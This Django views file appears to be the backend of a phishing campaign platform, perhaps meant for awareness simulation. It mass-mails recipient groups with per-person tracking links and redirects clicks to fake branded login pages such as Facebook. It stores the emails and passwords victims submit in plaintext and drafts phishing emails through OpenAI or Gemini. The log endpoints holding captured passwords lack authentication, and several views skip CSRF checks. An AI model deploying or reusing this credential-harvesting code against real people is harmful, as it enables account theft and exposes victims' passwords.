from rest_framework import viewsets, status
from .models import Sender, RecipientGroup, Recipient, Message, ClickLog, CredentialLog
from .serializers import SenderSerializer, RecipientGroupSerializer, RecipientSerializer, MessageSerializer, ClickLogSerializer, CredentialLogSerializer
from rest_framework.response import Response
from rest_framework.decorators import action, api_view, permission_classes
from django.core.mail import get_connection, EmailMessage, EmailMultiAlternatives

from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required

from django.http import JsonResponse
from django.utils.timezone import now
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
from django.shortcuts import render, redirect
from .utils import generate_phishing_email_open_ai, generate_phishing_email_gemini
from django.urls import reverse
import threading
import random, string, json, logging

from rest_framework.permissions import IsAuthenticated, AllowAny


logger = logging.getLogger(__name__)

def login_template_view(request, recipient_id, message_id, platform):
    template_name = f"email_templates/{platform.capitalize()}.html"
    return render(request, template_name, {"recipient_id": recipient_id, "message_id": message_id, "platform": platform})


class ClickLogViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = ClickLog.objects.select_related('recipient').order_by('-timestamp')
    serializer_class = ClickLogSerializer


class CredentialLogViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = CredentialLog.objects.select_related('recipient').order_by('-timestamp')
    serializer_class = CredentialLogSerializer


class SenderViewSet(viewsets.ModelViewSet):
    serializer_class = SenderSerializer
    permission_classes = [IsAuthenticated]

    def get_queryset(self):
        return Sender.objects.filter(user=self.request.user)

    def perform_create(self, serializer):
        serializer.save(user=self.request.user)


class RecipientGroupViewSet(viewsets.ModelViewSet):
    serializer_class = RecipientGroupSerializer
    permission_classes = [IsAuthenticated]

    def get_queryset(self):
        return RecipientGroup.objects.filter(user=self.request.user)

    def perform_create(self, serializer):
        serializer.save(user=self.request.user)

    @action(detail=True, methods=['post'])
    def add_recipient(self, request, pk=None):
        group = self.get_object()
        recipient_id = request.data.get('recipient_id')

        try:
            recipient = Recipient.objects.get(id=recipient_id)
        except Recipient.DoesNotExist:
            logger.error(f"Recipient with ID {recipient_id} not found.")
            return Response({"detail": "Recipient not found."}, status=404)

        group.recipients.add(recipient)
        logger.info(f"Recipient {recipient.email} added to group {group.name}")
        return Response({"detail": "Recipient added to the group."}, status=200)

    @action(detail=True, methods=['put'])
    def rename_group(self, request, pk=None):
        group = self.get_object()
        new_name = request.data.get('name', '')

        if not new_name.strip():
            return Response({"detail": "Group name cannot be empty."}, status=400)

        group.name = new_name
        group.save()
        logger.info(f"Group ID {group.id} renamed to {new_name}")
        return Response({"detail": "Group renamed successfully.", "name": new_name}, status=200)

    def destroy(self, request, *args, **kwargs):
        group = self.get_object()
        logger.info(f"Deleting group: {group.name}, ID: {group.id}")
        group.recipients.clear()
        logger.info(f"Cleared all recipients from group: {group.name}")
        group.delete()
        logger.info(f"Group {group.name} deleted successfully.")
        return Response(status=204)

    @action(detail=True, methods=['get'])
    def recipients(self, request, pk=None):
        group = self.get_object()
        recipients = group.recipients.all()
        serializer = RecipientSerializer(recipients, many=True)
        return Response(serializer.data)



class RecipientViewSet(viewsets.ModelViewSet):
    queryset = Recipient.objects.all()
    serializer_class = RecipientSerializer

    @action(detail=True, methods=['put'])
    def update_recipient(self, request, pk=None):
        recipient = self.get_object()
        serializer = self.get_serializer(recipient, data=request.data, partial=True)
        if serializer.is_valid():
            serializer.save()
            logger.info(f"Recipient {recipient.email} updated successfully.")
            return Response(serializer.data)
        logger.error(f"Error updating recipient {recipient.email}: {serializer.errors}")
        return Response(serializer.errors, status=400)

    @action(detail=True, methods=['delete'])
    def delete_recipient(self, request, pk=None):
        recipient = self.get_object()
        recipient.delete()
        logger.info(f"Recipient {recipient.email} deleted successfully.")
        return Response({"message": "Recipient deleted successfully."}, status=204)


def send_email_async(email):
    email.send()


class MessageViewSet(viewsets.ModelViewSet):
    queryset = Message.objects.all()
    serializer_class = MessageSerializer
    permission_classes = [IsAuthenticated]

    def get_queryset(self):
        return Message.objects.filter(user=self.request.user)

    @action(detail=False, methods=['post'])
    def preview(self, request):
        """
        Этот эндпоинт создаёт черновик сообщения (но не сохраняет его в БД)
        и возвращает данные для предпросмотра.
        """
        sender_id = request.data.get("sender")
        group_id = request.data.get("recipient_group")
        campaign_name = request.data.get("campaign_name", "Unnamed Campaign")
        subject = request.data.get("subject")
        body = request.data.get("body")
        platform = request.data.get("platform", "facebook")
        host = request.data.get("host", settings.BASE_URL)

        try:
            sender = Sender.objects.get(id=sender_id)
            group = RecipientGroup.objects.get(id=group_id)
        except Sender.DoesNotExist:
            return Response({"detail": "Sender not found."}, status=404)
        except RecipientGroup.DoesNotExist:
            return Response({"detail": "Recipient Group not found."}, status=404)

        recipients = group.recipients.all()
        if not recipients:
            return Response({"detail": "No recipients in the group."}, status=400)

        recipient_id = recipients[0].id  # Берём первого получателя

        tracking_link = f"{host}{reverse('track_click', args=[recipient_id, '0', platform])}"

        message_data = {
            "sender": sender.id,
            "recipient_group": group.id,
            "campaign_name": campaign_name,
            "subject": subject,
            "body": f"{body}\n\n🔗 Click here: {tracking_link}",
        }

        return Response({
            "message": message_data,
            "recipient_id": recipient_id
        }, status=200)

    @action(detail=False, methods=['post'])
    def send_message(self, request):
        print("send_message вызван")
        sender_id = request.data.get("sender")
        group_id = request.data.get("recipient_group")
        campaign_name = request.data.get("campaign_name", "Unnamed Campaign")
        subject = request.data.get("subject")
        body = request.data.get("body")
        platform = request.data.get("platform", "facebook")
        host = request.data.get("host", settings.BASE_URL)

        try:
            sender = Sender.objects.get(id=sender_id)
            group = RecipientGroup.objects.get(id=group_id)
        except Sender.DoesNotExist:
            return Response({"detail": "Sender not found."}, status=404)
        except RecipientGroup.DoesNotExist:
            return Response({"detail": "Recipient Group not found."}, status=404)

        recipients = group.recipients.all()
        if not recipients:
            return Response({"detail": "No recipients in the group."}, status=400)

        try:
            connection = get_connection(
                backend='django.core.mail.backends.smtp.EmailBackend',
                host=sender.smtp_host,
                port=sender.smtp_port,
                username=sender.smtp_username,
                password=sender.smtp_password,
                use_tls=sender.smtp_port == 587,
                use_ssl=sender.smtp_port == 465
            )

            message = Message.objects.create(
                user=request.user,
                sender=sender,
                recipient_group=group,
                campaign_name=campaign_name,
                subject=subject,
                body=body,
                link=None,
                host=host
            )

            message.recipients.set(recipients)

            for recipient in recipients:
                tracking_link = f"{host}{reverse('track_click', args=[recipient.id, message.id, platform])}"

                email_body = body.replace("[Suspicious Link]", tracking_link)
                
                # recipient_name = f"{recipient.first_name} {recipient.last_name}"
                # email_body = email_body.replace("[Recipient's Name]", recipient_name)


                email = EmailMultiAlternatives(
                    subject=subject,
                    body=email_body,
                    from_email=sender.smtp_username,
                    to=[recipient.email],
                    connection=connection
                )
                email.attach_alternative(email_body, "text/html")

                thread = threading.Thread(target=send_email_async, args=(email,))
                thread.start()

            message.link = f"{host}{reverse('track_click', args=[recipients[0].id, message.id, platform])}"
            message.save()

            print("Сообщение сохранено в БД:", message.id)

            return Response({"status": "Messages sent successfully"}, status=201)

        except Exception as e:
            return Response({"detail": f"Email sending failed: {str(e)}"}, status=500)


def track_click(request, recipient_id, message_id, platform):
    ip = get_client_ip(request)
    user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

    try:
        recipient = Recipient.objects.get(id=recipient_id)
        message = Message.objects.get(id=message_id)
    except Recipient.DoesNotExist:
        return JsonResponse({"error": "Recipient not found"}, status=404)
    except Message.DoesNotExist:
        return JsonResponse({"error": "Message not found"}, status=404)

    existing_click = ClickLog.objects.filter(recipient=recipient, message=message, platform=platform).exists()

    if not existing_click:
        ClickLog.objects.create(
            recipient=recipient,
            message=message,
            platform=platform,
            ip_address=ip,
            user_agent=user_agent,
            timestamp=now()
        )

    return redirect(f"/login-template/{recipient_id}/{message_id}/{platform}/")

def capture_credentials(request, recipient_id, message_id, platform):

    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("password")
        ip = get_client_ip(request)
        user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')

        try:
            recipient = Recipient.objects.get(id=recipient_id)
            message = Message.objects.get(id=message_id)
        except Recipient.DoesNotExist:
            recipient = None

        CredentialLog.objects.create(
            recipient=recipient,
            message=message,
            email=email,
            password=password,
            ip_address=ip,
            user_agent=user_agent,
            timestamp=now(),
            platform=platform,
        )

        return JsonResponse({"status": "success"}, status=200)

    return JsonResponse({"status": "error"}, status=400)

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@csrf_exempt
def send_test_email(request):

    if request.method == "POST":
        try:
            data = json.loads(request.body)
            email = data.get("email")
            smtp_host = data.get("smtp_host")
            smtp_port = int(data.get("smtp_port"))
            smtp_username = data.get("smtp_username")
            smtp_password = data.get("smtp_password")

            if not (email and smtp_host and smtp_port and smtp_username and smtp_password):
                return JsonResponse({"error": "All SMTP fields and recipient email are required"}, status=400)

            logger.info(f"Sending test email to {email} using SMTP {smtp_host}:{smtp_port} as {smtp_username}")

            connection = get_connection(
                backend="django.core.mail.backends.smtp.EmailBackend",
                host=smtp_host,
                port=smtp_port,
                username=smtp_username,
                password=smtp_password,
                use_tls=smtp_port == 587,
                use_ssl=smtp_port == 465,
            )

            email_message = EmailMessage(
                subject="Test Email",
                body="This is a test email to verify SMTP settings.",
                from_email=smtp_username,
                to=[email],
                connection=connection
            )

            result = email_message.send()

            if result > 0:
                return JsonResponse({"message": "Test email sent successfully"}, status=200)
            else:
                return JsonResponse({"error": "Failed to send test email"}, status=500)

        except json.JSONDecodeError:
            return JsonResponse({"error": "Invalid JSON format"}, status=400)
        except Exception as e:
            logger.error(f"Error sending test email: {str(e)}")
            return JsonResponse({"error": str(e)}, status=500)

    return JsonResponse({"error": "Invalid request method"}, status=400)

@csrf_exempt
def generate_email_view(request):
    if request.method != "POST":
        return JsonResponse({"error": "Only POST requests are allowed."}, status=405)

    try:
        data = json.loads(request.body)
        subject = data.get("subject", "Important Notice")
        employee_name = data.get("employee_name", "Valued Customer")  # Default fallback
        model = data.get("model", "openai").lower()

        if not subject.strip():
            return JsonResponse({"error": "Subject is required."}, status=400)

        # Generate phishing email using the selected model
        if model == "gemini":
            email_body = generate_phishing_email_gemini(subject, employee_name)
        else:
            email_body = generate_phishing_email_open_ai(subject, employee_name)

        return JsonResponse({"email": email_body}, json_dumps_params={"indent": 4})

    except json.JSONDecodeError:
        return JsonResponse({"error": "Invalid JSON format."}, status=400)
    except Exception as e:
        logger.error(f"Error generating phishing email: {str(e)}")
        return JsonResponse({"error": "An error occurred while generating the email."}, status=500)

# ----------------------------------------------------------------------------------
def add_cors_headers(response):
    response["Access-Control-Allow-Origin"] = "http://localhost:3000"
    response["Access-Control-Allow-Credentials"] = "true"
    response["Access-Control-Allow-Headers"] = "content-type, X-CSRFToken, authorization"
    response["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response\

def check_auth_view(request):
    if request.user.is_authenticated:
        return JsonResponse({"authenticated": True})
    return JsonResponse({"authenticated": False})

@login_required(login_url="/login/")
def main_page_view(request):
    return JsonResponse({"message": "Welcome to the main page!"})

def generate_credentials():
    username = "user" + "".join(random.choices("0123456789", k=6))
    password = "".join(random.choices(string.ascii_letters + string.digits, k=8))
    return username, password

@api_view(["POST"])
@permission_classes([AllowAny])
def signup_view(request):
    username = "user" + "".join(random.choices("0123456789", k=6))
    password = "".join(random.choices(string.ascii_letters + string.digits, k=8))
    user = User.objects.create_user(username=username, password=password)

    return Response({
        "message": "User created successfully",
        "username": username,
        "password": password
    }, status=201)

@api_view(["GET"])
@permission_classes([IsAuthenticated])
def check_auth_view(request):
    return Response({"authenticated": True, "username": request.user.username})

@api_view(["GET"])
@permission_classes([IsAuthenticated])
def current_user_view(request):
    return Response({"username": request.user.username})


@api_view(['POST'])
@permission_classes([IsAuthenticated])
def change_password_view(request):
    current_password = request.data.get('current_password')
    new_password = request.data.get('new_password')
    confirm_password = request.data.get('confirm_password')

    if not current_password or not new_password or not confirm_password:
        return Response({'message': 'All fields are required.'}, status=status.HTTP_400_BAD_REQUEST)

    if new_password != confirm_password:
        return Response({'message': 'New password and confirmation do not match.'}, status=status.HTTP_400_BAD_REQUEST)

    user = request.user

    if not user.check_password(current_password):
        return Response({'message': 'Current password is incorrect.'}, status=status.HTTP_400_BAD_REQUEST)

    user.set_password(new_password)
    user.save()

    # При JWT не нужно логиниться заново, токен действует, пока не истечет

    return Response({'message': 'Password changed successfully.'}, status=status.HTTP_200_OK)


@api_view(['PATCH'])
@permission_classes([IsAuthenticated])
def change_username_view(request):
    new_username = request.data.get('new_username')

    if not new_username:
        return Response({"message": "New username is required."}, status=400)

    if User.objects.filter(username=new_username).exclude(id=request.user.id).exists():
        return Response({"message": "Username already taken."}, status=400)

    request.user.username = new_username
    request.user.save()

    return Response({"message": "Username updated successfully.", "username": request.user.username}, status=200)

@api_view(['GET'])
@permission_classes([IsAuthenticated])
def current_user_view(request):
    user = request.user
    return Response({"username": user.username})